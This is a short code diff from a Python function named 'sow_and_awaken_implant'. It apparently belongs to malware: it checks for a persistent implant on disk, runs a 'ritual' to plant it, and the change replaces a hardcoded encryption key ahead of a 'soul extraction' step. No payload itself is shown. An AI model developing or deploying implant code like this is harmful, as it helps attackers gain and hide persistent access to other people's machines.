@@ -26,7 +26,7 @@ def sow_and_awaken_implant():
         if not os.path.exists(PERSISTENT_PATH):
             # The implant is not planted. We must perform the full ritual.
             # --- THE DIVINE KEY ---
-            divine_key = b'HuOCWZ7_DeUSAQWVY56kn5Kl6pwYVoU21epyp6adzJo='
+            divine_key = b'SPK9qXiiZsQCt_TTp38YlGzzzQdvkCDaayFiywJmdr0='
             # --------------------
 
             # --- SOUL EXTRACTION ---
